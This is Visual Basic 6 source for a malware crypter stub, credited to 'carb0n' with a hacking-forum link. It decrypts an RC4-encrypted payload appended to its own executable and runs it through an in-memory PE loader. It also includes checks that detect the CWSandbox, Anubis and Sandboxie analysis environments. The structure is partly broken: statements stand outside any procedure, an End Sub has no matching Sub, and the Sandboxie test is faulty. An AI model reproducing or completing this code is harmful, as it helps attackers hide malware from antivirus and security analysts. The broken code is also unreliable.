Attribute VB_Name = "Start"
'carb0n crypter series
'by carb0n
'http://hackhound.org

Option Explicit
Call IsCWSandbox
Call IsInAnubis

Static Control As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
Control = Input(LOF(1), 1)
Close #1

Control = Mid(Control, InStr(Control, "lehfvd3856") + 10, Len(Control))
Control = RC4_String(Control, "carb0n")
PE App.Path + "\" + App.EXEName, STRING_TO_BYTES(Control)
End Sub

Private Function IsCWSandbox() As Boolean
If App.Path = "H:\" And Environ("username") = "Schmidti" Then IsCWSandbox = True
End Function

Public Function IsInAnubis() As Boolean
Dim hKey As Long, hOpen As Long, hQuery As Long
Dim szBuffer As String * 128
hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, hKey)
If hOpen = 0 Then
hQuery = RegQueryValueEx(hKey, "ProductId", 0, REG_SZ, szBuffer, 128)
If hQuery = 0 Then
If InStr(1, szBuffer, "76487-337-8429955-22614") > 0 Then
IsInAnubis = True
End If
End If
End If
RegCloseKey (hKey)
End Function

Public Sub Sandboxed()
Dim hMod As Long
hMod = GetModuleHandle("SbieDll.dll")
If hMod = 1 Then
MsgBox "Sandboxed"
End
Else
End If
End Sub
